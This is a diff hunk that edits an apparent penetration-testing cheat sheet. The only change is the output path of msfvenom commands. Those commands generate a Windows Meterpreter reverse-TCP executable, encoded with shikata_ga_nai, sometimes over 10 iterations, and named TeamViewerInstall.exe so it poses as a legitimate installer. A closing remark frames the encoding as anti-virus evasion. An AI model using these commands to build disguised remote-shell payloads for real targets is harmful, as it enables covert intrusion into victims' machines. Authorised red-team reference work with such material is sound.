@@ -417,12 +417,12 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER 
 
 **Generate a payload with the exe format, called TeamViewerInstall.exe**
 ```bash
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -o /root/Desktop/TeamViewerInstall.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
 ```  
 
 **Generate a payload with the exe format, called TeamViewerInstall.exe running it through multiple iterations**
 ```bash
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
 ```  
 
 As expected, most anti-virus products that we will encounter in the wild would still detect this payload so we would have to use other methods for AV evasion.
